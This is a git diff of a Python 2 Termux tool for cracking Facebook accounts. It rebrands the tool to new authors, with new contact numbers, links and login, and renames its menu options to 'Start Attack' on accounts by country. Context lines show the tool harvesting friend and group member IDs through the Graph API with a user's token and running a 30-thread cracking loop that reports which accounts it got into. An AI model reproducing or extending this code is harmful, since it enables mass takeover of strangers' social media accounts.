@@ -124,7 +124,7 @@ ____¶¶¶¶____________¶¶¶¶¶¶___________¶¶¶¶____
 ______¶¶¶__________¶¶¶__¶¶¶__________¶¶______ 
 _______¶¶¶_________¶______¶_________¶¶¶______
  
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo6 = """
 \033[1;93m•_____________$$$$
 ____________$$$$$$$
@@ -150,7 +150,7 @@ _________$$_____$______$$$
 __________$$____ ______$$$
 ____________$$$___$$$$$
 ______________$$$$$
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo7 = """
 \033[1;92m•___________$_____$_____$
 _____$____$$_____$______$$____$
@@ -178,7 +178,7 @@ ___$$____$$___$$$$$$$___$$____$$
 ____$$____$____$$$$$____$____$$
 _____$_____$___________$_____$
 ______$____$___________$____$
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo8 = """
 \033[1;95m	
                      .ed$$$" ""$$$$$be.
@@ -213,7 +213,7 @@ logo8 = """
            $.d$$$*     lovehacker              *  J$$$e*
             $$$$                            "$$$"
 
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo9 = """
 \033[1;95m•	
                       o
@@ -280,7 +280,7 @@ $$$$$$$$$$$  o$""$$$$$$$$$$        $$$$$$$$$$$                "o
                                              "Lovehacker"
                                                
  
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo10 = """
 \033[1;93m
                         z$b
@@ -295,7 +295,7 @@ logo10 = """
                         $P*$
                        4P  *r
                        4    %
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo11 = """
 \033[1;96m                            ______
                          ___)    (___
@@ -318,9 +318,9 @@ YOOo      OOO      oOOP
    `OOOOOI```IOOOOO'
     `OOOOI,,,IOOOO'
      `OOOOOOOOOOO'
-       `~OOOOO~'   BlackMafia
+       `~OOOOO~'   Arbab Memon The Baziger
 
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo12 = """
 \033[1;91m•~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿
 ░╦░╔╗╗╗╦═╗░░╔╗╔╦╗╦╔░╔═╗╔╗░ ░╗╗╗╔╔╗╔╗░
@@ -356,27 +356,27 @@ logo14 = """
 \033[1;96m            ___           _,.---,---.,_
             |         ,;~'             '~;, 
             |       ,;                     ;,      
-   Frontal  |      ;                         ; ,--- BlackMafia Mind
+   Frontal  |      ;                         ; ,--- Baziger Mind
     Bone    |     ,'                         /'
             |    ,;                        /' ;,
             |    ; ;      .           . <-'  ; |
             |__  | ;   ______       ______   ;<----- Coronal Suture
            ___   |  '/~"     ~" . "~     "~\'  |
            |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
- Maxilla,  |      |   |        }:{        | <------ Freedom in the 
-Nasal and  |      |   l       / | \       !   |         Sky
+ Maxilla,  |      |   |        }:{        | <------ Robot Speed
+Nasal and  |      |   l       / | \       !   |         
 Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~. 
-  Bones    |      |    ----;' / | \ `;-<--------- Infraorbital Foramen
+  Bones    |      |    ----;' / | \ `;-<--------- Thinking Pressure
            |__     \__.       \/^\/       .__/  
-              ___   V| \                 / |V <--- Mastoid Process 
+              ___   V| \                 / |V <--- SpeedUp Commond
               |      | |T~\___!___!___/~T| |  
               |      | |`IIII_I_I_I_IIII'| |  
      Mandible |      |  \,III I I I III,/  | 
               |       \   `~~~~~~~~~~'    /
-              |         \   .       . <-x---- Mental Foramen
+              |         \   .       . <-x---- Father Of Termux
               |__         \.    ^    ./   
                             ^~~~^~~~^                                
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo15 = """
 \033[1;92m•                      _____ 
             ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
@@ -403,7 +403,7 @@ logo15 = """
 :    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
 |`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
 `·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo16 = """
 \033[1;92m	
                             (
@@ -439,7 +439,7 @@ logo16 = """
        (: <     ):  --:   ^  \  )(   )\/:   /   /_/ ) :._) :
         \..)   (_..  ..  :    :  : .(   \..:..    ./__.  ./
                    ^    ^      \^ ^           ^\/^     ^
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo17 = """
 \033[1;91m                       uuuuuuuuuuuuuuuuuuuuu.
                    .u$$$$$$$$$$$$$$$$$$$$$$$$$$W.
@@ -488,7 +488,7 @@ $$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                               $$$$$$$$$$$$$$$$$$$$$$!
                             $$$$$$$$$$$$$$$$$$$$$$$`
                              $$$$$$$$$$$$$$$$$$$$"
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo18 = """
 \033[1;93m                         __________
                       .~#########%%;~.
@@ -513,7 +513,7 @@ X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
       ` ,                @#%,.@  @@                `
                           @@@  @@@  
 
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo19 = """
 \033[1;91m•	
      .... NO! ...                  ... MNO! ...
@@ -540,7 +540,7 @@ logo19 = """
          ................................
 
                                     `    `                    ';                    ;¤¹
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo20 = """
 \033[1;95m	
              nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn.
@@ -603,7 +603,7 @@ HMMMMXM~                                MM>
                    MMMMMMMMMMMMMMMMMMM                  MMMM
                    XMMMMM
 
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo21 = """	
 \033[1;92m
  #
@@ -650,18 +650,16 @@ logo21 = """
                                   ###
                                   ##
                                   #
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo22 = """
 \033[1;95m
-   _____           _   _           
-  / ____|         | | | |          
- | |  __  ___   __| | | |__  _   _ 
- | | |_ |/ _ \ / _` | | '_ \| | | |
- | |__| | (_) | (_| | | |_) | |_| |
-  \_____|\___/ \__,_| |_.__/ \__, |
-                              __/ |
-                             |___/ 
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+╭━━╮╭━━━┳━━━┳━━━━┳━━┳━━━┳━━━┳━━━╮
+┃╭╮┃┃╭━╮┃╭━╮┣━━╮━┣┫┣┫╭━╮┃╭━━┫╭━╮┃
+┃╰╯╰┫┃╱┃┃┃╱┃┃╱╭╯╭╯┃┃┃┃╱╰┫╰━━┫╰━╯┃
+┃╭━╮┃╰━╯┃╰━╯┃╭╯╭╯╱┃┃┃┃╭━┫╭━━┫╭╮╭╯
+┃╰━╯┃╭━╮┃╭━╮┣╯━╰━┳┫┣┫╰┻━┃╰━━┫┃┃╰╮
+╰━━━┻╯╱╰┻╯╱╰┻━━━━┻━━┻━━━┻━━━┻╯╰━╯
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -704,16 +702,16 @@ jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭�
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-jalan("\033[1;93m▇▇\033[1;95m           WellCome to BlackMafia     \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;95m           WellCome to ArbabMemon     \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;92m            Tool Update EveryDay      \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num 03094161457    \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num 03003023263    \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;92mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
+print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;92mBazigerArbab\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "love"
-CorrectPassword = "lovehacker"
+CorrectUsername = "Baziger"
+CorrectPassword = "ArbabMemon"
 
 loop = 'true'
 while (loop == 'true'):
@@ -721,15 +719,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:love_hacker
+            print "Logged in successfully as " + username #Dev:Arbab_Memon
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+            os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 
 def login():
 	os.system('clear')
@@ -741,9 +739,9 @@ def login():
                 time.sleep(0.05)
 		print logo13
 		jalan(' \033[1;91mWarning● \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning● \033[1;92mUse a New Account To Login' )
+		jalan(' \033[1;91mWarning● \033[1;92mUse a New Account (Fresh) To Login' )
 		jalan(' \033[1;91mWarning● \033[1;92mTermux All Version Work ' )                 
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		print('\033[1;97m  ▬\x1b[1;91m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
 		print('	' )
 		id = raw_input('\033[1;97m[●] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
@@ -827,9 +825,9 @@ def menu():
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mDisclaimer\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
         time.sleep(0.05)
-        print "\033[1;95mThis presentation is for educational"
+        print "\033[1;95mJust for educational"
         time.sleep(0.05)
-        print "\033[1;95mpurposes ONLY.How you use this information "
+        print "\033[1;95mpurposes Only.How you use this information "
         time.sleep(0.05)
         print "\033[1;95mis your responsibility.I will not be  "
         time.sleep(0.05)
@@ -839,29 +837,29 @@ def menu():
         time.sleep(0.05)
         print "\033[1;95mActivitieThisTool is forEducational Purpose"
         time.sleep(0.05)
-        print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
+        print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
         time.sleep(0.05)
-	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m1 .\x1b[1;93m Start Cloning India         \033[1;93m▇▇"
+	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m1 .\x1b[1;93m Start Attack Indian.        \033[1;93m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m2 .\x1b[1;92m Start Cloning Pak ID/Group  \033[1;92m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m2 .\x1b[1;92m Start Attack Pak IDs/Group  \033[1;92m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m3 .\x1b[1;91m Start Cloning Indonasia     \033[1;91m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m3 .\x1b[1;91m Start Attack Indonasia      \033[1;91m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m4 .\x1b[1;94m Start Cloning USA ID        \033[1;94m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m4 .\x1b[1;94m Start Attack USA ID         \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m5 .\x1b[1;91m Start Cloning Bangladash    \033[1;91m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m5 .\x1b[1;91m Start Attack Bangladash     \033[1;91m▇▇"
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m6 .\x1b[1;92m Start Cloning All Country   \033[1;92m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m7 .\x1b[1;93m Start Cloning Member Group  \033[1;93m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m7 .\x1b[1;93m Start Attack Member Group   \033[1;93m▇▇"
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m8 .\x1b[1;91m Start Target  Attack        \033[1;91m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m9 .\033[1;94m Start Cloning Indian Old    \033[1;94m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m9 .\033[1;94m Start Attack Indian Old     \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m10.\033[1;96m Start Cloning Pakistan Old  \033[1;96m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m10.\033[1;96m Start Attack Pakistan Old   \033[1;96m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m11.\x1b[1;95m Black Mafia   Massage       \033[1;95m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m11.\x1b[1;95m Bazger Arbab  Massage       \033[1;95m▇▇"
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m12.\033[1;93m Login Using   Token         \033[1;93m▇▇"
         time.sleep(0.05)
@@ -869,7 +867,7 @@ def menu():
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m14.\033[1;96m After Cloning Data Reset    \033[1;96m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m15.\033[1;95m Start Cloning BlackMafia    \033[1;95m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m15.\033[1;95m Start Cloning ArbabMemon    \033[1;95m▇▇"
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m16.\033[1;94m Start Cloning Testing       \033[1;94m▇▇"
         time.sleep(0.05)
@@ -920,11 +918,11 @@ def pilih():
                 jalan('\033[1;96mpkg install git')
                 jalan('\033[1;96mpip2 install requests')
                 jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/lovehackerAsif/World")
-                jalan('\033[1;96mcd World')
-                jalan('\033[1;96mpython2 Cloning.py')
-                jalan('\033[1;96mUser: love')
-                jalan('\033[1;96mpass: lovehacker')
+                jalan("\033[1;96mgit clone https://github.com/ArbabMemon/Baziger")
+                jalan('\033[1;96mcd Baziger')
+                jalan('\033[1;96mpython2 Baziger.py')
+                jalan('\033[1;96mUser: Baziger')
+                jalan('\033[1;96mpass: ArbabMemon')
                 jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
 		os.system('git pull origin master')
@@ -984,11 +982,11 @@ def crack():
 	print logo20
 	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Mafia WhatsApp Group Pakistan."
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mArbab WhatsApp Group Pakistan."
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Mafia Group Cloning."
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mArbab Group Cloning."
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;95mBlack Mafia Youtube Chenal."
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;95mArbab Youtube Chenal."
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
@@ -1002,7 +1000,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1017,7 +1015,7 @@ def pilih_crack():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
                 os.system('clear')
@@ -1038,7 +1036,7 @@ def pilih_crack():
 		for p in s['data']:
 			id.append(p['id'])
         elif peak =="4":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1052,9 +1050,9 @@ def pilih_crack():
 	for o in titik:
 		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
 	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	
 			
 	def main(arg):
@@ -1063,7 +1061,7 @@ def pilih_crack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Arbab.Memon
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -1272,8 +1270,8 @@ def pilih_crack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Arbab_Memon
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -1298,10 +1296,10 @@ _______¶¶¶_________¶______¶_________¶¶¶______
          Checkpoint ID Open After 7 Days
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
+: \033[1;91m ....ArbabMemon  TheBaziger....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +923094161457"""
+              \033[1;91m +923003023263"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -1320,9 +1318,9 @@ def hack():
 	print logo9
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
         time.sleep(0.05)
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;96mBlack Mafia WhatsApp Group Indonasia."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;96mArbab WhatsApp Group Indonasia."
         time.sleep(0.05)
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;96mBlack Mafia Youtube Chenal."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;96mArbsb Youtube Chenal."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_hack()
@@ -1336,7 +1334,7 @@ def pilih_hack():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1351,10 +1349,10 @@ def pilih_hack():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/D72BfJByaCRIDJcbJvOOfE')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
